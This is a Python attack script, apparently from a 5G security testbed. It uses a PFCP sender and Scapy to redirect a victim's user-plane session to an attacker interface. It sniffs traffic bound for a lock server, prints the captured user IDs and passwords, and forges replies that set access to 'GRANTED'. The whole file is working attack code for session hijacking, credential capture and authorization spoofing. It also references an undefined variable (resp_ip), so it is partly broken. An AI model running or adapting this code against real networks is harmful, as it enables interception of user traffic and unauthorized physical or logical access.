import sys

sys.path.insert(1, "../PFCP")

from PFCP_packet_sender import PFCP_sender

from scapy.all import sendp, send, Packet, hexdump, Ether, BitField, IP, ICMP, bind_layers, BitEnumField, get_if_addr, sniff
from threading import Thread, Event
import os
import sys
import time

from Lock_data import Lock_server_ip, Lock_ue
lock_iface=Lock_ue
ue_ip=get_if_addr(lock_iface)
attacker_iface="uesimtun0"
src_ip=get_if_addr(attacker_iface)

victim_seid=0
gnb_ip="10.0.2.15"

class Key(Packet):
    name="Key"
    fields_desc= [BitEnumField(name="Access", default=2, size=2, enum={0:"DENIED", 1: "GRANTED", 2: "REQUEST"}), BitField(name="User_ID", default=0, size=6), BitField(name="User_Password", default=0, size=8)]

bind_layers(IP, Key, proto=2)
bind_layers(Ether, IP, type=0x800)


on=Event()
pfcp=PFCP_sender()

def send_to_me():
    pfcp.targeted_session_eavesdrop_modification_request(seid=victim_seid)        
def send_to_lock():
    pfcp.targeted_session_eavesdrop_modification_request(seid=victim_seid, send_to=gnb_ip)        
    

def handle_packet(pkt):

    if not pkt[IP].dst==Lock_server_ip:
        return
    else:
        ID=pkt[IP][Key].User_ID
        password=pkt[IP][Key].User_Password
        print(ID, password)
        key=pkt[IP][Key]
        key.Access=1
        send_to_lock()
        resp=resp_ip/key
        sendp(resp, iface=attacker_iface)

def sniffer(on):
    #print (Lock_server_ip)
    sniff(iface="enp0s3", prn=handle_packet, filter="ip", stop_filter= lambda x:on.is_set())

    print ("Ended.")

thread=Thread(target=sniffer, args=(on,))
thread.start()

while True:

    try:
        time.sleep(1)
    except KeyboardInterrupt:
        on.set()
        break
thread.join()

